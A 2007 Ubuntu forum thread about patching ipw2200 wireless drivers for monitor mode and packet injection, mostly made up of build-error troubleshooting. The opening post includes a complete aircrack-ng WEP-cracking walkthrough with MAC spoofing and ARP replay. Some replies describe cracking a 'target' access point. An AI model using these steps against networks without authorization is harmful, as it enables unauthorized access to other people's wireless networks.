---
title: "HOWTO: Injection/monitor mode with ipw2200 drivers on Ubuntu Feisty"
date: 2007-07-14
forum: Networking &amp; Wireless
---

### Post by motin on 2007-07-14
[SIZE="4"]Guide on how to prepare (patch) ipw2200 drivers on Ubuntu Feisty to enable monitor mode and/or injection capabilities[/SIZE]
by Motin, based on a mix of several existing guides (thanks all!), adapted to work on Ubuntu Feisty

Purpose: The stock ipw2200 drivers does not support packet injection, nor does it support monitor mode for certain cards. Patching the drivers may make this possible. To make it work for Feisty, it is necessary to start off with certain versions of ieee80211 and ipw2200, namely 1.2.17 and 1.2.1 respectively. (Native Feisty drivers are 1.1.13 and 1.2.0 respectively).

**1. Install necessary packages**
```
    sudo apt-get install build-essential
    sudo apt-get install linux-source
    sudo apt-get install linux-headers-`uname -r`
    sudo apt-get install sharutils

```

    Make sure you have the current linux-headers available in /usr/src/linux
```
    sudo mv /usr/src/linux /usr/src/linux_bak
    sudo ln -s /usr/src/linux-headers-`uname -r`/ /usr/src/linux
    ls -l /usr/src/linux/ # Should not be empty

```

**2. Patch drivers**

     a. Download the source code to ipw2200  version 1.2.1 from: [http://ipw2200.sourceforge.net/downloads.php](http://ipw2200.sourceforge.net/downloads.php)
     b. Download the source code to ieee80211 version 1.2.17 from: [http://ieee80211.sourceforge.net/#downloads](http://ieee80211.sourceforge.net/#downloads)
     c. Download the ipw22000 injection patch for v1.2.1 from here: [http://ubuntuforums.org/showthread.php?p=2532936#post2532936](http://ubuntuforums.org/showthread.php?p=2532936#post2532936)
     d. Put all your downloaded files in the same directory and cd into that directory in a terminal
     e. Unpack archives
```
	tar -xvf ipw2200-1.2.1-inject_patch.tar.gz
	tar -xvf ipw2200-*.tgz
	tar -xvf ieee80211-*.tgz

```
     f. Apply patch
```
	patch -p0 < ipw2200-1.2.1-inject.patch
	patch -p0 < ipw2200-1.2.1-inject_Makefile.patch

```
On top of this, you need to make a manual change in the Makefile described in this post: [http://ubuntuforums.org/showthread.php?p=2576816#post2576816](http://ubuntuforums.org/showthread.php?p=2576816#post2576816)

      g. Compile and install ieee80211
```
         cd ..
         cd ieee80211-*
         sudo sh remove-old # This will uninstall earlier drivers, so make sure you have access to a wired connection just in case anything goes wrong
         sudo make
	 # 'y' in all Questions
         sudo make install

```
      h. Compile and install patched ipw2200
```
         cd ipw2200-1.2.1
         sudo sh remove-old # This will uninstall earlier drivers, so make sure you have access to a wired connection just in case anything goes wrong
	 # 'y' in all Questions
         sudo make
         sudo make install

```
    i. Check the current versions of ipw2200 and ieee80211 to make sure you have the new drivers installed:
```
	dmesg | grep ipw # Output should contain "Intel(R) PRO/Wireless 2200/2915 Network Driver, 1.2.1"
	dmesg | grep ieee # Output should contain "802.11 data/management/control stack, 1.2.17"

```

3. Load and verifiy the new drivers:
```
	sudo rmmod ipw2200
	sudo modprobe ipw2200 rtap_iface=1
	sudo ifconfig rtap0 up
	ifconfig rtap0 # Should not be empty nor print any error message

```

When you wish to reload the original driver (without the rtap interface), use this:
```
	sudo ifconfig rtap0 down
	sudo rmmod ipw2200
	sudo modprobe ipw2200
```
If this doesn't help restart your computer and you should be back to normal

[SIZE="4"]Quick security check guide[/SIZE]
Assuming your wireless network card is configured on eth1:

```
# Prepare driver for tap mode
    sudo rmmod ipw2200;
    sudo modprobe ipw2200 rtap_iface=1;
    sudo ifconfig rtap0 up
    ifconfig rtap0

# Optional first step: Open up a terminal and run the following to easily track the status of your wireless card:
watch -n1 "iwconfig eth1";

# Prepare variables
sudo airodump-ng -w capture -i rtap0; # Use this output to find fill out the values below
   # If the current network uses MAC association control you need to (prior to filling below) switch to one of the associated clients' MAC addresses:
   sudo ifconfig eth1 down # Shuts down the interface once again to allow mac changes
   sudo ifconfig eth1 hw ether # MAC of an associated client
   sudo ifconfig eth1 up
export  AP_ESSID=
export  AP_CHANNEL=
export AP_MAC_ADDRESS=
export ETH1_MAC_ADDRESS=
# Open up 4 consoles and run the above commands in all of them

# Terminal No. 1 - Preparing card
# Run exports above
while [ 1 ] ; do
    sudo iwconfig eth1 essid $AP_ESSID key FFFF-FFFF mode managed;
    sleep 1;
    sudo iwconfig eth1 key off;
    sleep 20;
done

# Terminal No. 2 - Start dumping packages
# Run exports above
sudo airodump-ng -c $AP_CHANNEL -w capture -i rtap0;  # Note: We are not using  --ivs since we want to be able to use the fast ptw cracking method
# Using the PTW method, 40-bit WEP can be cracked with as few as 20,000 data packets and 104-bit WEP with 40,000 data packets. Otherwise, you will need approximately 250,000 IVs for 64 bit and 800,000-1,500,000 IVs for 128bit keys. 

# Terminal No. 3 - Generate traffic to get more packages dumped faster
# Run exports above
sudo aireplay-ng -3 -b $AP_MAC_ADDRESS -h $ETH1_MAC_ADDRESS -i rtap0 eth1
# Note: with attack 3 that we are using, some other client must connect to the router before aireplay can start sending packets

# Terminal No. 4 - Crack (Try now and then when you have started gathering packets)
# Run exports above
aircrack-ng -b $AP_MAC_ADDRESS capture*.ivs
# Or, if you have installed the newer version (that supports the PTW method that needs less than 10 times less packages)
aircrack-ng -z -b $AP_MAC_ADDRESS capture*.cap

# When key is found and normal connection to the network is preferred:
	sudo ifconfig rtap0 down;
	sudo rmmod ipw2200; 
	sudo modprobe ipw2200;
# If this doesn't help restart and you should be back to normal
```

EDIT 24-jul-2007 02:22: Fixed the initial apt-get of linux-headers to include the -`uname -r`part...

---

### Post by Faceache on 2007-07-19
hi, thanks for making this guide. I wonder if someone can help me out with a problem I have when trying to complete this..

when attempting to complie things I get the following message:

andy@andy-laptop:/newipw/ieee80211-1.2.17$ sudo sh remove-old 
Checking in /lib/modules/2.6.20-16-generic for ieee80211 components...
andy@andy-laptop:/newipw/ieee80211-1.2.17$ sudo make          
Makefile:17: 
Makefile:18: WARNING: $SHELL not set to bash.
Makefile:19: If you experience build errors, try
Makefile:20: 'make SHELL=/bin/bash'.
Makefile:21: 
Checking in /lib/modules/2.6.20-16-generic for ieee80211 components...
make -C /lib/modules/2.6.20-16-generic/build M=/newipw/ieee80211-1.2.17 modules
make[1]: Entering directory `/usr/src/linux-headers-2.6.20-16-generic'
Makefile:499: /usr/src/linux-headers-2.6.20-16-generic/arch/i386/Makefile: No such file or directory
make[1]: *** No rule to make target `/usr/src/linux-headers-2.6.20-16-generic/arch/i386/Makefile'.  Stop.
make[1]: Leaving directory `/usr/src/linux-headers-2.6.20-16-generic'
make: *** [modules] Error 2


It's probably a silly mistake on my part but I'd appreciate a nudge in the right direction.

TIA

---

### Post by clemensvb on 2007-07-22
Hi motin, 

I have the same problem here too. I would appreciate any help.

Thanks.

--->jonas@jonas-laptop:~/Desktop/ipw2200/ieee80211-1.2.18$ sudo sh remove-old
Password:
Checking in /lib/modules/2.6.20-16-generic for ieee80211 components...
find: /lib/modules/2.6.20-16-generic/build/: No such file or directory
/lib/modules/2.6.20-16-generic/kernel/net/ieee80211/ieee80211_crypt_tkip.ko
/lib/modules/2.6.20-16-generic/kernel/net/ieee80211/ieee80211_crypt.ko
/lib/modules/2.6.20-16-generic/kernel/net/ieee80211/ieee80211.ko
/lib/modules/2.6.20-16-generic/kernel/net/ieee80211/ieee80211_crypt_wep.ko
/lib/modules/2.6.20-16-generic/kernel/net/ieee80211/ieee80211_crypt_ccmp.ko
Above files found.  Remove? [y],n y
find: /lib/modules/2.6.20-16-generic/build/: No such file or directory
grep: /lib/modules/2.6.20-16-generic/build//.config: No such file or directory
grep: /lib/modules/2.6.20-16-generic/build//include/linux/autoconf.h: No such file or directory
find: /lib/modules/2.6.20-16-generic/build/: No such file or directory

---

### Post by motin on 2007-07-23
This is more or less a guess, but maybe this will help:

```
cd /usr/src/linux-headers-`uname -r`/
sudo make xconfig
```

(Just close the configuration window when it pops up)

I think this creates the necessary configuration files, but really I am not the guy to help out with kernel configuration preparation. :)

---

### Post by elninom on 2007-07-23
Hi i`m newbie in ubuntu
Why i got that messages?what i should do?

```

akiner@Aki:~$ sudo mv /usr/src/linux-headers-2.6.20-16-generic /usr/src/linux-headers-2.6.20-16-generic_bak
mv: cannot stat `/usr/src/linux-headers-2.6.20-16-generic': No such file or directory

```

```

akiner@Aki:~/ipw2200$ patch -p0 < ipw2200-1.2.1-inject.patch
patching file ipw2200-1.2.1/ipw2200.c
Hunk #1 succeeded at 2271 with fuzz 2 (offset 300 lines).
Hunk #2 FAILED at 12048.
1 out of 2 hunks FAILED -- saving rejects to file ipw2200-1.2.1/ipw2200.c.rej

```

```

akiner@Aki:~/ipw2200$ patch -p0 < ipw2200-1.2.1-inject_Makefile.patch
patching file ipw2200-1.2.1/Makefile
Reversed (or previously applied) patch detected!  Assume -R? [n] n
Apply anyway? [n] y
Hunk #1 FAILED at 13.
Hunk #2 FAILED at 30.
2 out of 2 hunks FAILED -- saving rejects to file ipw2200-1.2.1/Makefile.rej
akiner@Aki:~/ipw2200$ 

```

```

akiner@Aki:~/ipw2200$ sudo rmmod ipw2200
ERROR: Module ipw2200 does not exist in /proc/modules

```

---

### Post by motin on 2007-07-23
> **elninom said:**
> Hi i`m newbie in ubuntu
Why i got that messages?what i should do?

```

akiner@Aki:~$ sudo mv /usr/src/linux-headers-2.6.20-16-generic /usr/src/linux-headers-2.6.20-16-generic_bak
mv: cannot stat `/usr/src/linux-headers-2.6.20-16-generic': No such file or directory

```


```
    sudo apt-get install build-essential
    sudo apt-get install linux-source
    sudo apt-get install linux-headers-`uname -r` # <-- You need this
    sudo apt-get install sharutils

```

For the patching, follow the instructions, which were:
> d. Put all your downloaded files in the same directory and cd into that directory in a terminal
Then apply the patches. You are running from withing the ipw2200 directory...

---

### Post by elninom on 2007-07-25
```

ipw2200-1.2.1-inject.patch
ipw2200-1.2.1-inject_Makefile.patch
akiner@aki:~$ patch ipw2200-1.2.1/ipw2200.c ipw2200-1.2.1-inject.patch
patching file ipw2200-1.2.1/ipw2200.c
akiner@aki:~$ patch ipw2200-1.2.1/Makefile ipw2200-1.2.1-inject_Makefile.patch
patching file ipw2200-1.2.1/Makefile
akiner@aki:~$ cd ipw2200-1.2.1
akiner@aki:~/ipw2200-1.2.1$ sudo ./remove-old
Password:
Checking in /lib/modules/2.6.20-15-generic/build/ for ipw2x00 components...
/lib/modules/2.6.20-15-generic/build/include/config/ipw2200.h
/lib/modules/2.6.20-15-generic/build/include/config/ipw2100.h
Unloaded: ipw2200
Above files found.  Remove? [y],n y
CONFIG_IPW2100=m
CONFIG_IPW2100_MONITOR=y
CONFIG_IPW2200=m
CONFIG_IPW2200_MONITOR=y
CONFIG_IPW2200_RADIOTAP=y
CONFIG_IPW2200_PROMISCUOUS=y
CONFIG_IPW2200_QOS=y
CONFIG_IPW2100_FS_AMILO_M7400=m
Above definitions found.  Comment out? [y], n y
akiner@aki:~/ipw2200-1.2.1$ sudo make
mkdir -p /home/akiner/ipw2200-1.2.1/tmp/.tmp_versions
make -C /lib/modules/2.6.20-15-generic/build M=/home/akiner/ipw2200-1.2.1 MODVERDIR=/home/akiner/ipw2200-1.2.1/tmp/.tmp_versions modules
make[1]: Entering directory `/usr/src/linux-headers-2.6.20-15-generic'
  CC [M]  /home/akiner/ipw2200-1.2.1/ipw2200.o
  Building modules, stage 2.
  MODPOST 1 modules
  CC      /home/akiner/ipw2200-1.2.1/ipw2200.mod.o
  LD [M]  /home/akiner/ipw2200-1.2.1/ipw2200.ko
make[1]: Leaving directory `/usr/src/linux-headers-2.6.20-15-generic'
akiner@aki:~/ipw2200-1.2.1$ sudo make install
mkdir -p /home/akiner/ipw2200-1.2.1/tmp/.tmp_versions
make -C /lib/modules/2.6.20-15-generic/build M=/home/akiner/ipw2200-1.2.1 MODVERDIR=/home/akiner/ipw2200-1.2.1/tmp/.tmp_versions modules
make[1]: Entering directory `/usr/src/linux-headers-2.6.20-15-generic'
  Building modules, stage 2.
  MODPOST 1 modules
make[1]: Leaving directory `/usr/src/linux-headers-2.6.20-15-generic'
install -d /lib/modules/2.6.20-15-generic/kernel/drivers/net/wireless/
install -m 644 -c ipw2200.ko /lib/modules/2.6.20-15-generic/kernel/drivers/net/wireless/
/sbin/depmod -a 2.6.20-15-generic
Don't forget to copy firmware to your hotplug's firmware directory and have the
hotplug tools in place.
See INSTALL for more information.
akiner@aki:~/ipw2200-1.2.1$ sudo rmmod ipw2200
ERROR: Module ipw2200 does not exist in /proc/modules

```

I`m trying two days but everytime i had same error
ERROR: Module ipw2200 does not exist in /proc/modules
also patches now properly working only "patching file ipw2200-1.2.1/ipw2200.c" say.If applied again :
```

Hunk #1 succeeded at 2031 with fuzz 2 (offset 60 lines).
Hunk #2 FAILED at 11808.
1 out of 2 hunks FAILED -- saving rejects to file ipw2200-1.2.1/ipw2200.c.rej

```
Can anybody already patched working driver files to send me?my email [email]elninomelninon@gmail.com[/email]

All files in same directory
I tried updated ubuntu 7.04,kubuntu 7.04,ubuntu 6.10 however never success...
Now i have only wired connection,wireless connection is unshow
Please help me im out of my mind
Thanks

---

### Post by BOBSONATOR on 2007-08-06
Nvm, try this

[http://www.aircrack-ng.org/doku.php?id=ipw2200](http://www.aircrack-ng.org/doku.php?id=ipw2200)

---

### Post by kmcq on 2007-08-18
hey everyone, thanks for the guide, i seem to have an issue when i actually try and use the aircrack suite... ive looked all over this board and aircrack's board for tutorials on the ipw2200, so i think i correctly set it up, and i think im correctly using the aircrack suite, yet when i try to use attack 3 (er the arpreplay or whatever?) it will read lots of packets, but i am not sending or receiving packets, and my data packets are not increasing AT ALL

i then tried to follow a different guide using attack -4 i believe (chopchop perhaps?) this seemed to be doing the trick, but when i try to crack the key, i have been unsuccessful thus far event though im using -ptw and i have 375738 IVs, maybe its just a tough key =\

i am running ubuntu feisty 7.04, on a dell latitude c400, using an internal intel 2200 bg wifi card using ipw2200 1.2.1 (and its patched), ieee80211 is also updated (1.2.17 i think?), and im using aircrack suite ver. .9.1 r656 that i got today off their repo... any tips would be great THANKS

edit: nevermind, i tried the guide on the aircrack site again, and tried the guide for quick security check and it worked, and i was able to crack the key as well... one suggest however, i ran into trouble with aircrack whenever i wanted to use .cap files... i discovered that if i ran airodump with -i, it would save the dump file as an .ivs file, removing -i saved it as a .cap, which i needed to use -z for aircrack... but other then that it worked great

one other note, i had had some difficulty setting up my card in iwconfig to auth to my target's AP, and on top of that the gnome wireless network manager kept authing me to open networks, so what i did was told the gnome manager to auth me to my target and when it asked for a key i just punched a few keys to make it shut up, it seemed to work just as well as running iwconfig ethx essid ... etc. 
i was able to crack what i think was 108bit in 3:25 according to aircrack's timer using just over 40000 IVs, thanks a bunch for this guide

---

### Post by seffius on 2007-08-26
Thank you so much for this guide!  Been trying for 2 days and couldn't get these drivers loaded until I came across this.  The only hiccup I had in the process was after :

```
dmesg | grep ipw # Output should contain "Intel(R) PRO/Wireless 2200/2915 Network Driver, 1.2.1"
dmesg | grep ieee # Output should contain "802.11 data/management/control stack, 1.2.17"
```
It was still showing the old versions, but after a restart it worked like a charm!

---

### Post by elfeffe on 2007-09-09
i can't get it to work

the ieee say it is ```
[    5.772000] ieee1394: Initialized config rom entry `ip1394'
[    7.108000] ieee1394: Host added: ID:BUS[0-00:1023]  GUID[434fc0000c293850]
[   20.116000] ieee80211_crypt: registered algorithm 'NULL'
[   20.220000] ieee80211: 802.11 data/management/control stack, 1.2.17
[   20.220000] ieee80211: Copyright (C) 2004-2005 Intel Corporation <jketreno@linux.intel.com>
[  217.432000] ieee80211_crypt: registered algorithm 'TKIP'

```

but the ipw2200 say 
```
[   20.288000] ipw3945: Intel(R) PRO/Wireless 3945 Network Connection driver for Linux, 1.2.0mp
[   20.288000] ipw3945: Copyright(c) 2003-2006 Intel Corporation
[   20.288000] ipw3945: Detected Intel PRO/Wireless 3945ABG Network Connection
[   22.248000] ipw3945: Detected geography ABG (13 802.11bg channels, 23 802.11a channels)

```


i followed ALL steps (a thousand times, restarted, i did everything)
it seems that ./remove-old is not working because it say ```
Checking in /lib/modules/2.6.20-16-generic/build/ for ipw2x00 components...

```
and doesn't find anything

anyway, it give no errors, and when i try to do the ```
sudo rmmod ipw2200

```

i get a beauty ```
ERROR: Module ipw2200 does not exist in /proc/modules

```

Can somebody help me?

---

### Post by vengaa on 2007-10-08
Hello, 

i have the same problems, after patching all . There was no errors by installing/compiling.

But after restarting the ubuntu feisty system, the ipw2200 works only in managed mode.

No monitor-mode , no rtap0 interface .

After "rmmod ipw2200" the interface chrashes complete, without any error messages.

Ifconfig and iwconfig shows no ipw2200 (eth1)...

Any solution???

Greetz, venga

---

### Post by HarryM on 2007-10-13
I have a similar problem. I've also installed the drivers. All looks ok, I get rtap0 and the driver versions are correct but rtap0 doesn't seem to be "connected" to my wireless card:

```

root@arta-slap:~/wifi-patch# iwconfig 
lo        no wireless extensions.

eth0      no wireless extensions.

eth1      unassociated  ESSID:""  
          Mode:Managed  Channel=0  Access Point: Not-Associated   
          Bit Rate:0 kb/s   Tx-Power=20 dBm   Sensitivity=8/0  
          Retry limit:7   RTS thr:off   Fragment thr:off
          Encryption key:off
          Power Management:off
          Link Quality:0  Signal level:0  Noise level:0
          Rx invalid nwid:0  Rx invalid crypt:0  Rx invalid frag:0
          Tx excessive retries:0  Invalid misc:0   Missed beacon:0

rtap0     no wireless extensions.

```

Any ideas?

PS:

airodump-ng rtap0 displays the same output as airodump-ng eth1 -- so I guess I just have no idea what's going on!

---

### Post by nilsja on 2007-10-15
hi,

i also get this error after make: sudo make```
Makefile:17: 
Makefile:18: WARNING: $SHELL not set to bash.
Makefile:19: If you experience build errors, try
Makefile:20: 'make SHELL=/bin/bash'.
Makefile:21: 
Checking in /lib/modules/2.6.22-14-generic for ieee80211 components...
make -C /lib/modules/2.6.22-14-generic/build M=/home/mareike/Desktop/ja/ieee80211-1.2.17 modules
make[1]: Betrete Verzeichnis '/usr/src/linux-headers-2.6.22-14-generic'
/home/mareike/Desktop/ja/ieee80211-1.2.17/Makefile:17: 
/home/mareike/Desktop/ja/ieee80211-1.2.17/Makefile:18: WARNING: $SHELL not set to bash.
/home/mareike/Desktop/ja/ieee80211-1.2.17/Makefile:19: If you experience build errors, try
/home/mareike/Desktop/ja/ieee80211-1.2.17/Makefile:20: 'make SHELL=/bin/bash'.
/home/mareike/Desktop/ja/ieee80211-1.2.17/Makefile:21: 
  CC [M]  /home/mareike/Desktop/ja/ieee80211-1.2.17/ieee80211_tx.o
/home/mareike/Desktop/ja/ieee80211-1.2.17/ieee80211_tx.c: In Funktion »ieee80211_classify«:
/home/mareike/Desktop/ja/ieee80211-1.2.17/ieee80211_tx.c:232: Fehler: »struct sk_buff« hat kein Element namens »nh«
make[2]: *** [/home/mareike/Desktop/ja/ieee80211-1.2.17/ieee80211_tx.o] Fehler 1
make[1]: *** [_module_/home/mareike/Desktop/ja/ieee80211-1.2.17] Fehler 2
make[1]: Verlasse Verzeichnis '/usr/src/linux-headers-2.6.22-14-generic'
make: *** [modules] Fehler 2 

```
make install

---

### Post by Mamsaac on 2007-10-19
Similar problem to those above.

IEEE seems not to be installing correctly since the grep for ieee outputs as if it was still version 1.1.13.

```
wifi/ieee80211-1.2.18$ sudo sh remove-old
Checking in /lib/modules/2.6.20-16-generic for ieee80211 components...
/lib/modules/2.6.20-16-generic/net/ieee80211/ieee80211.ko
/lib/modules/2.6.20-16-generic/net/ieee80211/ieee80211_crypt.ko
/lib/modules/2.6.20-16-generic/net/ieee80211/ieee80211_crypt_wep.ko
/lib/modules/2.6.20-16-generic/net/ieee80211/ieee80211_crypt_ccmp.ko
/lib/modules/2.6.20-16-generic/net/ieee80211/ieee80211_crypt_tkip.ko
/lib/modules/2.6.20-16-generic/net/ieee80211/.tmp_versions/ieee80211.mod
/lib/modules/2.6.20-16-generic/net/ieee80211/.tmp_versions/ieee80211_crypt.mod
/lib/modules/2.6.20-16-generic/net/ieee80211/.tmp_versions/ieee80211_crypt_wep.mod
/lib/modules/2.6.20-16-generic/net/ieee80211/.tmp_versions/ieee80211_crypt_ccmp.mod
/lib/modules/2.6.20-16-generic/net/ieee80211/.tmp_versions/ieee80211_crypt_tkip.mod
/lib/modules/2.6.20-16-generic/include/net/ieee80211.h
/lib/modules/2.6.20-16-generic/include/net/ieee80211_crypt.h
/lib/modules/2.6.20-16-generic/include/net/ieee80211_radiotap.h
Above files found.  Remove? [y],n y

```

```
sudo make
Makefile:17: 
Makefile:18: WARNING: $SHELL not set to bash.
Makefile:19: If you experience build errors, try
Makefile:20: 'make SHELL=/bin/bash'.
Makefile:21: 
Checking in /lib/modules/2.6.20-16-generic for ieee80211 components...
make -C /lib/modules/2.6.20-16-generic/build M=/home/mamsaac/wifi/ieee80211-1.2.18 modules
make[1]: se ingresa al directorio `/usr/src/linux-headers-2.6.20-16-generic'
/home/mamsaac/wifi/ieee80211-1.2.18/Makefile:17: 
/home/mamsaac/wifi/ieee80211-1.2.18/Makefile:18: WARNING: $SHELL not set to bash.
/home/mamsaac/wifi/ieee80211-1.2.18/Makefile:19: If you experience build errors, try
/home/mamsaac/wifi/ieee80211-1.2.18/Makefile:20: 'make SHELL=/bin/bash'.
/home/mamsaac/wifi/ieee80211-1.2.18/Makefile:21: 
  Building modules, stage 2.
  MODPOST 5 modules
make[1]: se sale del directorio `/usr/src/linux-headers-2.6.20-16-generic'

```

```
sudo make install
Makefile:17: 
Makefile:18: WARNING: $SHELL not set to bash.
Makefile:19: If you experience build errors, try
Makefile:20: 'make SHELL=/bin/bash'.
Makefile:21: 
make -C /lib/modules/2.6.20-16-generic/build M=/home/mamsaac/wifi/ieee80211-1.2.18 modules
make[1]: se ingresa al directorio `/usr/src/linux-headers-2.6.20-16-generic'
/home/mamsaac/wifi/ieee80211-1.2.18/Makefile:17: 
/home/mamsaac/wifi/ieee80211-1.2.18/Makefile:18: WARNING: $SHELL not set to bash.
/home/mamsaac/wifi/ieee80211-1.2.18/Makefile:19: If you experience build errors, try
/home/mamsaac/wifi/ieee80211-1.2.18/Makefile:20: 'make SHELL=/bin/bash'.
/home/mamsaac/wifi/ieee80211-1.2.18/Makefile:21: 
  Building modules, stage 2.
  MODPOST 5 modules
make[1]: se sale del directorio `/usr/src/linux-headers-2.6.20-16-generic'
install -d /lib/modules/2.6.20-16-generic/net/ieee80211/
install -m 644 -c ieee80211.ko ieee80211_crypt.ko ieee80211_crypt_wep.ko ieee80211_crypt_ccmp.ko ieee80211_crypt_tkip.ko /lib/modules/2.6.20-16-generic/net/ieee80211/
install -d `echo /lib/modules/2.6.20-16-generic/include | grep "/net\$" || echo /lib/modules/2.6.20-16-generic/include/net`
install -m 644 -c net/ieee80211.h net/ieee80211_crypt.h net/ieee80211_radiotap.h `echo /lib/modules/2.6.20-16-generic/include | grep "/net\$" || echo /lib/modules/2.6.20-16-generic/include/net`
mkdir -p /lib/modules/2.6.20-16-generic/net/ieee80211//.tmp_versions
cd .tmp_versions && install -m 644 -c ieee80211.mod ieee80211_crypt.mod ieee80211_crypt_wep.mod ieee80211_crypt_ccmp.mod ieee80211_crypt_tkip.mod /lib/modules/2.6.20-16-generic/net/ieee80211//.tmp_versions
/sbin/depmod -a 2.6.20-16-generic

```

then...

```
dmesg | grep ieee
[    3.404000] ieee1394: Initialized config rom entry `ip1394'
[    6.976000] ieee1394: Host added: ID:BUS[0-00:1023]  GUID[374fc00015a53181]
[   17.536000] ieee80211_crypt: registered algorithm 'NULL'
[   17.556000] ieee80211: 802.11 data/management/control stack, git-1.1.13
[   17.556000] ieee80211: Copyright (C) 2004-2005 Intel Corporation <jketreno@linux.intel.com>

```

Anything more to be provided will be, as long as it's possible.

Thanks in advance for the help.

---

### Post by si_ija on 2007-11-15
> **HarryM said:**
> I have a similar problem. I've also installed the drivers. All looks ok, I get rtap0 and the driver versions are correct but rtap0 doesn't seem to be "connected" to my wireless card:

```

root@arta-slap:~/wifi-patch# iwconfig 
lo        no wireless extensions.

eth0      no wireless extensions.

eth1      unassociated  ESSID:""  
          Mode:Managed  Channel=0  Access Point: Not-Associated   
          Bit Rate:0 kb/s   Tx-Power=20 dBm   Sensitivity=8/0  
          Retry limit:7   RTS thr:off   Fragment thr:off
          Encryption key:off
          Power Management:off
          Link Quality:0  Signal level:0  Noise level:0
          Rx invalid nwid:0  Rx invalid crypt:0  Rx invalid frag:0
          Tx excessive retries:0  Invalid misc:0   Missed beacon:0

rtap0     no wireless extensions.

```

Any ideas?

PS:

airodump-ng rtap0 displays the same output as airodump-ng eth1 -- so I guess I just have no idea what's going on!

if you sure that you already installed the driver (correct driver version) and everything works well, then you are already in the right path !
now continue to crack the wep. :guitar:

---

### Post by HarryM on 2007-11-15
How do I check the driver version? I'll have a look and report back.

---

### Post by scottsee on 2007-11-28
Is this known to work patch update for Gutsy too??

---

### Post by scottsee on 2007-11-28
I spent 3 hours trying to update my drivers ipw2200 and Ieee80211 via the how-to.  I could not get it to work with the ipw2200.1.2.1 & ieee8011.1.2.17.  Everything went well untill I got down to the ipw2200.1.2.1 `sudo make` when I ran into this.

```
scott@laptop:~/Files/ipw2200-1.2.1$ sudo make
-e 
 ERROR: ieee80211.h not found in '/lib/modules/2.6.22-14-generic/include'.

You need to install the ieee80211 subsystem from http://ieee80211.sf.net
and point this build to the location where you installed those sources, eg.:

% make IEEE80211_INC=/usr/src/ieee80211/

will look for ieee80211.h in /usr/src/ieee802 11/net/

make: *** [check_inc] Error 1
scott@laptop:~/Files/ipw2200-1.2.1$ 

```  

After spending a LONG time trying to install the ipw2200 drivers that I had just deleted using `sudo su remove-old` back into the /lib/modules/kernel/net dirrectory.  After doing everything mentioned in the `less ieee80211-1.2.17/INSTALL` help menu without any prevail, I decited to try diffrent driver versions.  So I downloaded ieee80211-1.2.17 and ipw2200.1.2.2 went through the update (without Makefile patch) and everything went smooth..  I had to reboot before I could see the new ipw2200.1.2.2 driver in `dmesg | grep ipw`.  I have no idea why those versions would not cut it in Gutsy but I thought I would mention my stressfull evening incase somone else has an issue with this in Gutsy..

---

### Post by usmc1991 on 2007-12-16
I have followed all the steps in the above tutorial and everything works until I get to sudo make for the ieee80211 when I enter sudo make i get this: 

kyle@057-692-LAP:~/ieee80211-1.2.17$ sudo make
Makefile:17: 
Makefile:18: WARNING: $SHELL not set to bash.
Makefile:19: If you experience build errors, try
Makefile:20: 'make SHELL=/bin/bash'.
Makefile:21: 
Checking in /lib/modules/2.6.22-14-generic for ieee80211 components...
make -C /lib/modules/2.6.22-14-generic/build M=/home/kyle/ieee80211-1.2.17 modules
make[1]: Entering directory `/usr/src/linux-headers-2.6.22-14-generic'
/home/kyle/ieee80211-1.2.17/Makefile:17: 
/home/kyle/ieee80211-1.2.17/Makefile:18: WARNING: $SHELL not set to bash.
/home/kyle/ieee80211-1.2.17/Makefile:19: If you experience build errors, try
/home/kyle/ieee80211-1.2.17/Makefile:20: 'make SHELL=/bin/bash'.
/home/kyle/ieee80211-1.2.17/Makefile:21: 
  CC [M]  /home/kyle/ieee80211-1.2.17/ieee80211_tx.o
/home/kyle/ieee80211-1.2.17/ieee80211_tx.c: In function ‘ieee80211_classify’:
/home/kyle/ieee80211-1.2.17/ieee80211_tx.c:232: error: ‘struct sk_buff’ has no member named ‘nh’
make[2]: *** [/home/kyle/ieee80211-1.2.17/ieee80211_tx.o] Error 1
make[1]: *** [_module_/home/kyle/ieee80211-1.2.17] Error 2
make[1]: Leaving directory `/usr/src/linux-headers-2.6.22-14-generic'
make: *** [modules] Error 2

if anybody can help me it would be greatly appreciated. My wireless card has stopped working and i need it back ASAP. Thanks!

---

### Post by MyR on 2007-12-24
if your wireless stops working, it's probably easiest to reinstall ubuntu.

---

### Post by BlackRabbit_BE on 2007-12-26
Hi,

thanks for the great guide. It explains pretty good what has to be done.

However, as some other people apparently, I run into problems when trying to make the IEEE driver..
```

root@bart-laptop2:/home/bart/wifi/ieee80211-1.2.17# make
Makefile:17: 
Makefile:18: WARNING: $SHELL not set to bash.
Makefile:19: If you experience build errors, try
Makefile:20: 'make SHELL=/bin/bash'.
Makefile:21: 
Checking in /lib/modules/2.6.22-14-generic for ieee80211 components...
make -C /lib/modules/2.6.22-14-generic/build M=/home/bart/wifi/ieee80211-1.2.17 modules
make[1]: Entering directory `/usr/src/linux-headers-2.6.22-14-generic'
/home/bart/wifi/ieee80211-1.2.17/Makefile:17: 
/home/bart/wifi/ieee80211-1.2.17/Makefile:18: WARNING: $SHELL not set to bash.
/home/bart/wifi/ieee80211-1.2.17/Makefile:19: If you experience build errors, try
/home/bart/wifi/ieee80211-1.2.17/Makefile:20: 'make SHELL=/bin/bash'.
/home/bart/wifi/ieee80211-1.2.17/Makefile:21: 
  CC [M]  /home/bart/wifi/ieee80211-1.2.17/ieee80211_tx.o
/home/bart/wifi/ieee80211-1.2.17/ieee80211_tx.c: In function ‘ieee80211_classify’:
/home/bart/wifi/ieee80211-1.2.17/ieee80211_tx.c:232: error: ‘struct sk_buff’ has no member named ‘nh’
make[2]: *** [/home/bart/wifi/ieee80211-1.2.17/ieee80211_tx.o] Error 1
make[1]: *** [_module_/home/bart/wifi/ieee80211-1.2.17] Error 2
make[1]: Leaving directory `/usr/src/linux-headers-2.6.22-14-generic'
make: *** [modules] Error 2
root@bart-laptop2:/home/bart/wifi/ieee80211-1.2.17# 

```

The above suggestion (run 'make xconfig') did not do the trick :(

---

### Post by BlackRabbit_BE on 2007-12-27
Alright, found out that the problem lies with the 2.6.22 kernel (headers), as 'struct_sk_buff' (whatever that is) no longer features 'nh', hence the following error upon compilation of the ieee drivers:
```
‘struct sk_buff’ has no member named ‘nh’
```

So, my guess is we need newer ieee drivers. Will try the newest and hope this guide will still work for them.

---

### Post by BlackRabbit_BE on 2007-12-27
